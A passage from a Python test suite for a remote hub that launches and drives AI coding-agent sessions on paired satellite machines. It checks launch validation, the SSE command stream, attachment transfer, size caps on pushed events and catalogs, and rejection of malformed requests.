        self.assertEqual(replay[0]["data"]["launch_id"], launch_id)

    def test_launch_to_unknown_machine_is_404(self):
        # Nothing would ever drain a queue for a machine that never
        # registered: refuse instead of opening a journal for it.
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "nope-m9", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        self.assertEqual(status, 404, data)
        self.assertEqual(
            json.loads(data)["error"]["code"], "unknown_machine")
        replay, _ = self.srv.state.journal.read_since("_sat_nope-m9", 0)
        self.assertEqual(replay, [])
        self.assertEqual(self.srv.state.launches, {})

    def test_launch_to_named_machine_carries_the_pick(self):
        # The satellite advertises launch-option support on its machine
        # row, the same fields its own agent reports.
        catalog_mod.upsert_machine(self.srv.home, {
            "id": self.mid, "model_at_launch": ["claude"],
            "effort_at_launch": ["claude"]})
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go",
             "model": "opus", "effort": "high"},
            headers=self.srv.auth)
        self.assertEqual(status, 202, data)
        launch_id = json.loads(data)["launch_id"]
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay[0]["data"]["model"], "opus")
        self.assertEqual(replay[0]["data"]["effort"], "high")
        launch = self.srv.state.launches[launch_id]
        self.assertEqual((launch["model"], launch["effort"]),
                         ("opus", "high"))

    def test_launch_to_named_machine_refuses_a_bad_pick(self):
        # A malformed pick is a 422 before anything is queued.
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go", "effort": {"x": 1}},
            headers=self.srv.auth)
        self.assertEqual(status, 422, data)
        self.assertEqual(json.loads(data)["error"]["code"], "bad_command")
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay, [])
        self.assertEqual(self.srv.state.launches, {})

    def test_launch_to_named_machine_refuses_what_it_cannot_take(self):
        # The satellite's own advertised lists answer: it takes a model
        # for cursor (its registry says so, whatever the hub's says) but
        # not for gemini, so nothing is queued for gemini.
        catalog_mod.upsert_machine(self.srv.home, {
            "id": self.mid, "model_at_launch": ["cursor"],
            "effort_at_launch": []})
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "gemini",
             "cwd": "/tmp/x", "prompt": "go", "model": "opus"},
            headers=self.srv.auth)
        self.assertEqual(status, 409, data)
        body = json.loads(data)
        self.assertEqual(body["error"]["code"], "unsupported_launch_option")
        self.assertIn("can't take a model", body["error"]["message"])
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "cursor",
             "cwd": "/tmp/x", "prompt": "go", "effort": "high"},
            headers=self.srv.auth)
        self.assertEqual(status, 409, data)
        self.assertIn("can't take an effort level",
                      json.loads(data)["error"]["message"])
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay, [])
        self.assertEqual(self.srv.state.launches, {})

    def test_launch_to_an_old_satellite_refuses_the_pick(self):
        # A satellite too old to report launch-option support would
        # accept the command and silently drop the fields — so the hub
        # refuses before queueing instead.
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go", "model": "opus"},
            headers=self.srv.auth)
        self.assertEqual(status, 409, data)
        body = json.loads(data)
        self.assertEqual(body["error"]["code"], "unsupported_launch_option")
        self.assertIn("too old", body["error"]["message"])
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay, [])
        self.assertEqual(self.srv.state.launches, {})
        # No pick at all still queues on the same old agent.
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        self.assertEqual(status, 202, data)

    def test_satellite_launch_settles_from_events(self):
        _, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        launch_id = json.loads(data)["launch_id"]
        self._push_catalog([{"key": "claude:r9", "ownership": "attached"}])
        self.srv.state.catalog.refresh()
        self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [protocol.event(
                "session.launched", "claude:r9", self.mid,
                {"launch_id": launch_id})]},
            headers=self.srv.sat_auth)
        _, view = self.srv.request(
            "GET", f"/v1/launches/{launch_id}", headers=self.srv.auth)
        view = json.loads(view)
        self.assertEqual(view["state"], "started")
        self.assertEqual(view["key"], "claude:r9@sat-m1")

    def test_satellite_launch_failure_settles(self):
        _, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        launch_id = json.loads(data)["launch_id"]
        self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [protocol.event(
                "command.result", "", self.mid,
                {"op": "launch", "ok": False, "launch_id": launch_id,
                 "note": "no such folder on this machine: /tmp/x"})]},
            headers=self.srv.sat_auth)
        launch = self.srv.state.launches[launch_id]
        self.assertEqual(launch["state"], "failed")
        self.assertIn("no such folder", launch["note"])

    def test_satellite_untracked_launch_settles(self):
        catalog_mod.upsert_machine(self.srv.home, {
            "id": "sat-m1", "launchable": ["qwen-code"],
            "untracked_harnesses": ["qwen-code"]})
        _, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "qwen-code",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        launch_id = json.loads(data)["launch_id"]
        self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [protocol.event(
                "command.result", "", self.mid,
                {"op": "launch", "ok": True, "launch_id": launch_id})]},
            headers=self.srv.sat_auth)
        self.assertEqual(self.srv.state.launches[launch_id]["state"],
                         "untracked")

    def test_launch_refuses_harness_machine_lacks(self):
        catalog_mod.upsert_machine(
            self.srv.home, {"id": "sat-m1", "launchable": ["codex"]})
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        self.assertEqual(status, 422, data)
        self.assertEqual(json.loads(data)["error"]["code"], "not_launchable")

    def test_remote_attachment_stages_and_queues_pull(self):
        self._push_catalog([{
            "key": "claude:r1", "status": "idle",
            "ownership": "attached",
        }])
        self.srv.state.catalog.refresh()
        # Octet-stream upload by hand — request() JSON-encodes.
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request(
            "POST",
            "/v1/sessions/claude%3Ar1%40sat-m1/attachments?name=s.png",
            body=b"\x89PNG", headers={**self.srv.auth,
                                      "Content-Type": "application/octet-stream"},
        )
        resp = conn.getresponse()
        payload = json.loads(resp.read())
        conn.close()
        self.assertEqual(resp.status, 202)
        self.assertTrue(payload["queued"])
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        att = [c for c in replay if c["data"]["op"] == "attachment"]
        self.assertEqual(len(att), 1)
        self.assertEqual(att[0]["data"]["hub_key"], "claude:r1@sat-m1")
        # The staged file resolves under the hub key.
        ref = payload["ref"]
        self.assertIsNotNone(
            attachments.resolve(self.srv.home, "claude:r1@sat-m1", ref))


class TestAgentCommandStream(unittest.TestCase):
    """The command SSE endpoint: replay + live + presence."""

    def setUp(self):
        # Disconnect detection waits for a failed heartbeat write —
        # shrink the interval so tests see it fast.
        self._hb = patch("swe.remote.hub._SSE_HEARTBEAT_S", 0.1)
        self._hb.start()
        self.addCleanup(self._hb.stop)
        self.srv = _AgentHub()
        self.addCleanup(self.srv.stop)
        self.mid = "sat-m1"

    def _open_stream(self, last=0):
        """Raw-socket SSE client; returns (sock, buffered reader)."""
        cred = self.srv.sat_auth["Authorization"]
        sock = socket.create_connection(
            ("127.0.0.1", self.srv.port), timeout=10)
        sock.sendall(
            f"GET /v1/agent/commands?machine={self.mid}&last={last} "
            "HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"Authorization: {cred}\r\n"
            "Connection: keep-alive\r\n\r\n".encode()
        )
        reader = sock.makefile("rb")
        head = reader.readline()
        self.assertIn(b"200", head)
        while reader.readline() not in (b"\r\n", b"\n", b""):
            pass  # skip headers
        return sock, reader

    def _read_event(self, reader, timeout=5):
        """Read one SSE frame (blank-line terminated) or None."""
        sock = reader.raw._sock
        sock.settimeout(timeout)
        buf = b""
        while True:
            try:
                line = reader.readline()
            except (socket.timeout, TimeoutError):
                return None
            if not line:
                return None
            buf += line
            if line in (b"\r\n", b"\n"):
                return buf

    def test_stream_replays_queue_and_marks_online(self):
        self.srv.state.queue_command(
            self.mid, "control", "", {"ctl": "ping"})
        sock, reader = self._open_stream()
        try:
            frames = []
            while len(frames) < 2:
                fr = self._read_event(reader)
                if fr is None:
                    break
                frames.append(fr)
            text = b"".join(frames).decode()
            self.assertIn('"type": "command"', text)
            self.assertIn("journal.caught-up", text)
            # While open, the satellite reads as online.
            for _ in range(50):
                if self.srv.state.machine_online(self.mid):
                    break
                time.sleep(0.05)
            self.assertTrue(self.srv.state.machine_online(self.mid))
        finally:
            # makefile() dup'd the fd — the reader must close too before
            # the linger-RST on the socket actually reaches the hub.
            try:
                sock.setsockopt(
                    socket.SOL_SOCKET, socket.SO_LINGER,
                    struct.pack("ii", 1, 0))
            except OSError:
                pass
            try:
                reader.close()
            finally:
                sock.close()
        # Presence was registered while the stream was open; after close
        # the subscription drains and the machine flips offline.
        for _ in range(50):
            row = catalog_mod.load_machines(self.srv.home).get(self.mid)
            if row is not None and not row["online"]:
                break
            time.sleep(0.1)
        self.assertFalse(self.srv.state.machine_online(self.mid))
        row = catalog_mod.load_machines(self.srv.home)[self.mid]
        self.assertFalse(row["online"])

    def test_commands_requires_machine_param(self):
        status, _ = self.srv.request(
            "GET", "/v1/agent/commands", headers=self.srv.sat_auth)
        self.assertEqual(status, 422)

    def test_pull_attachment_route(self):
        payload, err = attachments.stage(
            self.srv.home, "claude:r1@sat-m1", "shot.png", b"PNGDATA")
        self.assertIsNone(err)
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request(
            "GET",
            "/v1/agent/attachments/claude%3Ar1%40sat-m1/"
            + payload["ref"],
            headers=self.srv.sat_auth)
        resp = conn.getresponse()
        self.assertEqual(resp.status, 200)
        self.assertEqual(resp.read(), b"PNGDATA")
        conn.close()

    def test_pull_attachment_404(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request(
            "GET",
            "/v1/agent/attachments/claude%3Anone%40sat-m1/missing.png",
            headers=self.srv.sat_auth)
        resp = conn.getresponse()
        self.assertEqual(resp.status, 404)
        conn.close()


class TestEndToEnd(unittest.TestCase):
    """A real RemoteAgent against a real hub over a real socket.

    Register → catalog push → command SSE → dispatch → command.result
    journaled under the hub-scoped key. The whole R3 loop.
    """

    def test_full_loop(self):
        with patch("swe.remote.hub._SSE_HEARTBEAT_S", 0.1):
            srv = _AgentHub()
            try:
                # A fresh satellite credential, unbound: the agent's own
                # register binds it to its generated machine_id.
                cred = srv._pair(role="satellite")["credential"]
                sat_home = temp_dir(self)
                agent = agent_mod.RemoteAgent(
                    srv.base, cred, home=sat_home)
                sess = _session("r1")
                agent.catalog._fetch = lambda: [sess]
                agent.catalog._status_of = lambda ss: ["idle"]
                # The usage push would fetch real provider quotas.
                agent._usage_loop = lambda: None
                fake = MagicMock()
                fake.send.return_value = inject.InjectResult(True, "sent")
                mid = agent.machine_id

                done = {}
                thread = threading.Thread(
                    target=lambda: done.setdefault(
                        "rc", agent.run()), daemon=True)

                with patch.object(inject, "injector_for",
                                  return_value=fake), \
                     patch.object(supervise, "meta_for", return_value={}):
                    thread.start()
                    try:
                        # Catalog push: hub lists the satellite row.
                        hub_key = f"claude:r1@{mid}"
                        for _ in range(100):
                            row = srv.state.catalog.row_for(hub_key)
                            if row and row.get("remote"):
                                break
                            time.sleep(0.1)
                        self.assertIsNotNone(row)
                        self.assertEqual(row["machine_id"], mid)

                        # Presence: machine registered online once the
                        # command stream connected.
                        for _ in range(100):
                            if srv.state.machine_online(mid):
                                break
                            time.sleep(0.1)
                        self.assertTrue(srv.state.machine_online(mid))

                        # Phone → hub → journal → SSE → agent dispatch.
                        srv.state.queue_command(
                            mid, "message", hub_key,
                            {"text": "remote hello", "mode": "queue",
                             "status": "idle"})
                        for _ in range(100):
                            if fake.send.called:
                                break
                            time.sleep(0.1)
                        self.assertTrue(fake.send.called)
                        sent = fake.send.call_args[0][1]
                        self.assertEqual(sent["text"], "remote hello")

                        # command.result flows back and lands in the
                        # hub journal under the hub-scoped key.
                        for _ in range(100):
                            evs, _ = srv.state.journal.read_since(
                                hub_key, 0)
                            if any(e["type"] == "command.result"
                                   for e in evs):
                                break
                            time.sleep(0.1)
                        result = [
                            e for e in evs
                            if e["type"] == "command.result"][-1]
                        self.assertTrue(result["data"]["ok"])
                        self.assertEqual(result["data"]["op"], "message")
                        self.assertEqual(result["machine"], mid)
                    finally:
                        agent._stop.set()
                        thread.join(timeout=10)

                # Stream close flips the machine offline.
                for _ in range(100):
                    row = catalog_mod.load_machines(srv.home).get(mid)
                    if row is not None and not row["online"]:
                        break
                    time.sleep(0.1)
                self.assertFalse(row["online"])
            finally:
                srv.stop()


class TestAgentEdges(unittest.TestCase):
    """agent.py: HTTP helpers, pairing, frame handling, op edges."""

    def setUp(self):
        self.home = temp_dir(self)

    def _agent(self):
        return agent_mod.RemoteAgent("http://h:1", "cred", self.home)

    def test_load_agent_corrupt(self):
        path = agent_mod.agent_file_for(self.home)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{bad")
        self.assertIsNone(agent_mod.load_agent(self.home))

    def test_post_http_error_json_and_plain(self):
        import urllib.error

        def raise_http(req, timeout=None):
            raise urllib.error.HTTPError(
                req.full_url, 429, "busy", {},
                io_bytes(b'{"err": 1}'))

        def io_bytes(data):
            import io
            return io.BytesIO(data)

        with patch("urllib.request.urlopen", raise_http):
            status, payload = agent_mod._post("http://h", "/x", "c", {})
        self.assertEqual(status, 429)
        self.assertEqual(payload, {"err": 1})

        def raise_plain(req, timeout=None):
            raise urllib.error.HTTPError(
                req.full_url, 500, "boom", {}, io_bytes(b'not json'))

        with patch("urllib.request.urlopen", raise_plain):
            status, payload = agent_mod._post("http://h", "/x", "c", {})
        self.assertEqual((status, payload), (500, {}))

    def test_post_network_error_returns_zero(self):
        with patch("urllib.request.urlopen", side_effect=OSError):
            self.assertEqual(
                agent_mod._post("http://h", "/x", "c", {}), (0, {}))

    def test_get_bytes(self):
        resp = MagicMock()
        resp.read.return_value = b"blob"
        resp.__enter__.return_value = resp
        with patch("urllib.request.urlopen", return_value=resp):
            self.assertEqual(
                agent_mod._get_bytes("http://h", "/x", "c"), b"blob")
        with patch("urllib.request.urlopen", side_effect=OSError):
            self.assertIsNone(agent_mod._get_bytes("http://h", "/x", "c"))

    def test_pair_agent_success_and_failure(self):
        with patch.object(agent_mod, "_post",
                          return_value=(200, {"credential": "c1",
                                              "device_id": "d1"})) as post:
            conf = agent_mod.pair_agent("http://h/", "tok", "mbp",
                                        self.home)
        self.assertEqual(conf["credential"], "c1")
        self.assertEqual(conf["hub"], "http://h")
        self.assertEqual(agent_mod.load_agent(self.home), conf)
        # The satellite claims its role at pair time; the hub binds it
        # to this machine at first register.
        self.assertEqual(post.call_args[0][3]["role"], "satellite")
        with patch.object(agent_mod, "_post", return_value=(401, {})):
            self.assertIsNone(
                agent_mod.pair_agent("http://h", "tok", "", self.home))

    def test_push_events_requeues_on_failure(self):
        ag = self._agent()
        ag.outbox = [{"type": "notify"}]
        with patch.object(agent_mod, "_post", return_value=(500, {})):
            self.assertFalse(ag._push_events())
        self.assertEqual(ag.outbox, [{"type": "notify"}])
        with patch.object(agent_mod, "_post", return_value=(200, {})):
            self.assertTrue(ag._push_events())
        self.assertEqual(ag.outbox, [])

    def test_push_events_empty_ok(self):
        self.assertTrue(self._agent()._push_events())

    def test_push_events_cuts_batches_by_bytes(self):
        # 50 events of 200 KB each are ~10 MB: the hub would refuse that
        # body with a 400 forever. Each POST stays under the cap.
        ag = self._agent()
        ag.outbox = [{"type": "notify", "seq": i, "data": {"x": "a" * 200_000}}
                     for i in range(1, 51)]
        sizes = []

        def post(hub, path, cred, payload, timeout=10.0):
            sizes.append(len(json.dumps(payload).encode()))
            return 200, {}

        with patch.object(agent_mod, "_post", side_effect=post):
            while ag.outbox:
                self.assertTrue(ag._push_events())
        self.assertGreater(len(sizes), 1)
        self.assertTrue(all(n <= agent_mod.EVENTS_BODY_MAX + 1024
                            for n in sizes))
        self.assertEqual(ag._outbox_ack, 50)

    def test_push_events_clips_an_oversized_event(self):
        ag = self._agent()
        ag.outbox = [{"type": "notify", "seq": 1,
                      "data": {"kind": "x", "text": "a" * (6 << 20)}}]
        with patch.object(agent_mod, "_post", return_value=(200, {})) as post:
            self.assertTrue(ag._push_events())
        sent = post.call_args[0][3]["events"][0]
        self.assertTrue(sent["data"]["text"].endswith("(truncated)"))
        self.assertEqual(sent["data"]["kind"], "x")
        self.assertLessEqual(len(json.dumps(sent).encode()),
                             agent_mod.EVENTS_BODY_MAX)
        self.assertEqual(ag._outbox_ack, 1)

    def test_push_events_acks_past_an_unclippable_event(self):
        # Many short strings can't be clipped under the cap: the event
        # is dropped and acked, and the next one still goes.
        ag = self._agent()
        ag.outbox = [{"type": "notify", "seq": 1,
                      "data": {"parts": ["b" * 500] * 20_000}},
                     {"type": "notify", "seq": 2, "data": {}}]
        with patch.object(agent_mod, "_post", return_value=(200, {})) as post:
            self.assertTrue(ag._push_events())
        self.assertEqual(post.call_args[0][3]["events"],
                         [{"type": "notify", "seq": 2, "data": {}}])
        self.assertEqual(ag._outbox_ack, 2)
        self.assertEqual(ag.outbox, [])

    def test_outbox_is_bounded(self):
        ag = self._agent()
        with patch.object(agent_mod, "OUTBOX_MAX", 3):
            for i in range(5):
                ag._capture("k", protocol.event("notify", "k", ag.machine_id,
                                                {"kind": "finished", "i": i}))
            self.assertEqual([e["data"]["i"] for e in ag.outbox], [2, 3, 4])
            # A failed push requeues without growing past the bound.
            with patch.object(agent_mod, "_post", return_value=(0, {})):
                self.assertFalse(ag._push_events())
            self.assertEqual(len(ag.outbox), 3)

    def test_push_catalog_posts_rows(self):
        ag = self._agent()
        ag.catalog._fetch = lambda: []
        ag.catalog._status_of = lambda ss: []
        calls = []
        with patch.object(
            agent_mod, "_post",
            side_effect=lambda *a: (calls.append(a) or (200, {}))):
            self.assertTrue(ag._push_catalog())
        self.assertEqual(calls[0][1], "/v1/agent/catalog")
        self.assertEqual(calls[0][3]["machine_id"], ag.machine_id)

    def test_push_catalog_trims_oldest_rows_to_fit(self):
        # Rows over the hub's 4 MiB body cap were refused whole, every
        # push; the newest that fit go instead.
        ag = self._agent()
        rows = [{"key": f"k{i}", "title": "t" * 100_000}
                for i in range(60)]
        ag.catalog.refresh = lambda: rows
        ag._refresh_launchable = lambda: False
        sent = []

        def post(hub, path, cred, body, timeout=10.0):
            sent.append(body)
            return 200, {}

        with patch.object(agent_mod, "_post", side_effect=post), \
                patch("sys.stderr"):
            self.assertTrue(ag._push_catalog())
        body = sent[0]
        self.assertLessEqual(len(json.dumps(body).encode()),
                             agent_mod.CATALOG_BODY_MAX)
        self.assertGreater(len(body["rows"]), 0)
        self.assertLess(len(body["rows"]), 60)
        self.assertEqual(body["rows"][0]["key"], "k0")

    def test_fit_rows_is_exact_at_the_cap(self):
        ag = self._agent()
        rows = [{"key": f"k{i}"} for i in range(3)]
        exact = len(json.dumps({"machine_id": ag.machine_id, "rows": rows},
                               ensure_ascii=False).encode())
        with patch.object(agent_mod, "CATALOG_BODY_MAX", exact):
            self.assertEqual(ag._fit_rows(rows), rows)
        with patch.object(agent_mod, "CATALOG_BODY_MAX", exact - 1), \
                patch("sys.stderr"):
            self.assertEqual(ag._fit_rows(rows), rows[:2])

    def test_handle_frame_malformed_and_noncommand(self):
        ag = self._agent()
        ag._handle_frame(b"{nope")                       # bad json
        ag._handle_frame(json.dumps({"type": "x"}).encode())  # not cmd
        ag._handle_frame(json.dumps(
            {"type": "command", "seq": "x", "data": {}}).encode())
        # A non-int seq still dispatches — no dedup cursor to advance.
        types = [e["type"] for e in ag.outbox]
        self.assertEqual(types, ["command.result"])

    def test_handle_frame_dedup_and_advance(self):
        ag = self._agent()
        ag._dispatch = lambda c: None
        cmd = {"type": "command", "seq": 5, "data": {"op": "x"}}
        ag._handle_frame(json.dumps(cmd).encode())
        self.assertEqual(ag._last_cmd_seq, 5)
        ag._handle_frame(json.dumps(cmd).encode())  # replay: no-op
        ag._handle_frame(json.dumps(
            {"type": "command", "seq": 4, "data": {"op": "x"}}).encode())
        self.assertEqual(ag._last_cmd_seq, 5)

    def test_execute_launch_snapshot(self):
        ag = self._agent()
        ag.catalog._fetch = lambda: []
        ag.catalog._status_of = lambda ss: []
        with patch.object(
            supervise, "launch_new", return_value=(True, "launched", {})
        ) as ln, patch.object(catalog_mod, "launch_command",
                              return_value="claude"):
            ok, note, _deg = ag._execute(
                "k", "launch",
                {"harness": "claude", "cwd": "/tmp", "prompt": "hi",
                 "launch_id": "l1", "model": "opus", "effort": "high"})
        self.assertTrue(ok)
        self.assertEqual(ln.call_args[1]["known_ids"], [])
        self.assertEqual(ln.call_args[1]["model"], "opus")
        self.assertEqual(ln.call_args[1]["effort"], "high")
        self.assertEqual(ln.call_args[1]["launch_id"], "l1")
        self.assertEqual(ln.call_args[1]["binary"], "claude")
        with patch.object(supervise, "launch_new") as ln, \
             patch.object(catalog_mod, "launch_command", return_value=None):
            ok, note, _deg = ag._execute(
                "k", "launch", {"harness": "gemini", "cwd": "/tmp"})
        self.assertFalse(ok)
        self.assertIn("Provider visibility", note)
        ln.assert_not_called()

    def test_adopted_launch_reports_session_launched(self):
        ag = self._agent()
        ag.catalog.refresh = lambda: []
        with patch.object(supervise, "adopt_pending",
                          return_value=["claude:new"]), \
             patch.object(supervise, "meta_for",
                          return_value={"launch_id": "l7"}), \
             patch.object(agent_mod, "_post", return_value=(200, {})):
            ag._push_catalog()
        launched = [e for e in ag.outbox if e["type"] == "session.launched"]
        self.assertEqual(launched[0]["session"], "claude:new")
        self.assertEqual(launched[0]["data"]["launch_id"], "l7")
        # A launched or forked session starts mid-turn: tail it hot.
        self.assertTrue(ag.tail_manager.is_hot("claude:new"))

    def test_register_403_prints_repair_once(self):
        # A permanently rejected credential must tell the user to
        # re-pair, not retry silently forever.
        import io
        from contextlib import redirect_stderr
        ag = self._agent()
        buf = io.StringIO()
        # The hub's error shape (protocol.error).
        refusal = {"error": {"code": "forbidden",
                             "message": "agent routes need a satellite "
                                        "credential"}}
        with patch.object(agent_mod, "_post", return_value=(403, refusal)):
            with redirect_stderr(buf):
                self.assertFalse(ag._register())
                self.assertFalse(ag._register())
        out = buf.getvalue()
        self.assertEqual(out.count("re-pair"), 1)
        # The hub's own reason, and the command that actually re-pairs a
        # satellite (`swe remote pair` takes no --hub or --token).
        self.assertIn("agent routes need a satellite credential", out)
        self.assertIn("swe remote agent --hub=<url> --token=<token>", out)
        self.assertNotIn("swe remote pair --hub", out)
        # A later accepted register clears the latch.
        with patch.object(agent_mod, "_post", return_value=(200, {})):
            self.assertTrue(ag._register())
        self.assertIsNone(ag._register_denied)

    def test_visibility_change_re_registers(self):
        ag = self._agent()
        items = [{"name": "kilo", "command": "kilo", "display_name": "Kilo",
                  "tracked": True}]
        with patch.object(catalog_mod, "launchable_harnesses",
                          return_value=items):
            self.assertTrue(ag._refresh_launchable())
            self.assertFalse(ag._refresh_launchable())
        self.assertEqual(ag.machine["launchable"], ["kilo"])

    def test_launch_result_echoes_launch_id(self):
        ag = self._agent()
        with patch.object(ag, "_execute", return_value=(False, "nope", False)):
            ag._dispatch({"session": "", "data": {
                "op": "launch", "command_id": "c1", "launch_id": "l3"}})
        result = [e for e in ag.outbox if e["type"] == "command.result"][-1]
        self.assertEqual(result["data"]["launch_id"], "l3")

    def test_execute_attachment_paths(self):
        ag = self._agent()
        # A failed pull (the hub unreachable) stages nothing. Stubbed, so
        # the test never resolves or dials the fake hub host.
        with patch.object(agent_mod, "_get_bytes", return_value=None) as pull:
            ok, note, _deg = ag._execute("claude:k", "attachment", {"ref": "r.png"})
        self.assertFalse(ok)
        self.assertEqual(note, "attachment fetch failed")
        # Without a hub_key the pull URL carries the local key.
        self.assertEqual(pull.call_args[0][1],
                         "/v1/agent/attachments/claude%3Ak/r.png")
        self.assertIsNone(attachments.resolve(self.home, "claude:k", "r.png"))
        with patch.object(agent_mod, "_get_bytes", return_value=b"png") as pull:
            ok, note, _deg = ag._execute("claude:k", "attachment",
                                   {"ref": "r.png", "hub_key": "hk"})
        self.assertTrue(ok)
        self.assertEqual(note, "staged")
        self.assertEqual(pull.call_args[0][1], "/v1/agent/attachments/hk/r.png")
        # place() keeps the hub's ref so a later message op resolves it.
        self.assertIsNotNone(
            attachments.resolve(self.home, "claude:k", "r.png"))

    def test_execute_message_unknown_ref(self):
        ag = self._agent()
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        ok, note, _deg = ag._execute(
            "k", "message", {"text": "hi", "attachments": ["nope"]})
        self.assertFalse(ok)
        self.assertIn("unknown attachment", note)

    def test_detach_and_kill_drop_staged_files_keep_does_not(self):
        # As on the hub: a session this machine no longer drives loses
        # its staged attachments; a kept one still runs and may read them.
        ag = self._agent()
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        fake = MagicMock()
        fake.control.return_value = inject.InjectResult(True, "ok")

        def staged(key):
            attachments.place(self.home, key, "r.png", b"png")
            return attachments.resolve(self.home, key, "r.png")

        with patch.object(inject, "injector_for", return_value=fake):
            for ctl in ("detach", "kill"):
                self.assertIsNotNone(staged("claude:k"))
                ok, _n, _d = ag._execute("claude:k", "control", {"ctl": ctl})
                self.assertTrue(ok)
                self.assertIsNone(
                    attachments.resolve(self.home, "claude:k", "r.png"), ctl)
            self.assertIsNotNone(staged("claude:k"))
            fake.control.return_value = inject.InjectResult(False, "no")
            ag._execute("claude:k", "control", {"ctl": "detach"})
            # A failed detach keeps them.
            self.assertIsNotNone(
                attachments.resolve(self.home, "claude:k", "r.png"))
        with patch.object(supervise, "keep", return_value=(True, "kept")):
            ag._execute("claude:k", "control",
                        {"ctl": "detach", "mode": "keep"})
        self.assertIsNotNone(
            attachments.resolve(self.home, "claude:k", "r.png"))

    def test_when_idle_detach_drops_staged_files_once_it_fires(self):
        # The deferred detach keeps the files while it waits (and if it
        # is cancelled), drops them when its detach succeeds, keeps them
        # when it fails.
        ag = self._agent()
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        key = "claude:k"
        attachments.place(self.home, key, "r.png", b"png")
        supervise.mark(self.home, key, {"mode": "tmux", "tmux": "qv-x"})
        scheduled = {}

        def schedule(k, **kw):
            scheduled.update(kw)
            return True

        def staged():
            return attachments.resolve(self.home, key, "r.png")

        with patch.object(ag.detaches, "schedule", side_effect=schedule):
            ok, _n, _d = ag._detach_when_idle(key, sess)
        self.assertTrue(ok)
        self.assertIsNotNone(staged())  # waiting
        scheduled["report"](False, "cancelled", True)
        self.assertIsNotNone(staged())  # cancelled
        fake = MagicMock()
        fake.control.return_value = inject.InjectResult(False, "no")
        with patch.object(inject, "injector_for", return_value=fake):
            self.assertFalse(scheduled["fire"]()[0])
            self.assertIsNotNone(staged())  # failed detach
            fake.control.return_value = inject.InjectResult(True, "ok")
            self.assertTrue(scheduled["fire"]()[0])
        self.assertIsNone(staged())

    def test_execute_approval_and_control_and_error(self):
        ag = self._agent()
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        fake = MagicMock()
        fake.approval.return_value = inject.InjectResult(True, "ok")
        fake.control.return_value = inject.InjectResult(False, "nope")
        with patch.object(inject, "injector_for", return_value=fake):
            ok, _, _deg = ag._execute(
                "k", "approval",
                {"request_id": "r", "decision": "allow"})
            self.assertTrue(ok)
            ok, note, _deg = ag._execute(
                "k", "control", {"ctl": "interrupt"})
            self.assertFalse(ok)
            fake.send.side_effect = RuntimeError("kaboom")
            ok, note, _deg = ag._execute("k", "message", {"text": "x"})
            self.assertFalse(ok)
            self.assertIn("kaboom", note)
        # Outside the patch: an unmarked session hits the detach guard.
        ok, note, _deg = ag._execute("k", "message", {"text": "x"})
        self.assertFalse(ok)
        self.assertIn("detached", note)


class TestAgentRouteValidation(unittest.TestCase):
    """hub.py satellite routes: malformed bodies and validation 422s."""

    def setUp(self):
        self.srv = _AgentHub()
        self.addCleanup(self.srv.stop)
        self.mid = "sat-m1"

    def _raw(self, method, path, data, ctype="application/json"):
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request(method, path, body=data,
                     headers={**self.srv.sat_auth, "Content-Type": ctype})
        resp = conn.getresponse()
        body = resp.read()
        conn.close()
        return resp.status, body

    def test_register_bad_body(self):
        status, _ = self._raw("POST", "/v1/agent/register", b"{bad")
        self.assertIn(status, (400, 422))

    def test_register_machine_must_be_an_object(self):
        for machine in ("sat-m1", ["sat-m1"], 7, True):
            status, _ = self.srv.request(
                "POST", "/v1/agent/register", {"machine": machine},
                headers=self.srv.sat_auth)
            self.assertEqual(status, 422, machine)

    def test_non_finite_numbers_are_an_unreadable_body(self):
        # Stored and served back, NaN/Infinity break every client's
        # JSON parser, so the hub refuses them at the door.
        for raw in (b'{"machine_id": "sat-m1", "rows": [{"key": "c:1",'
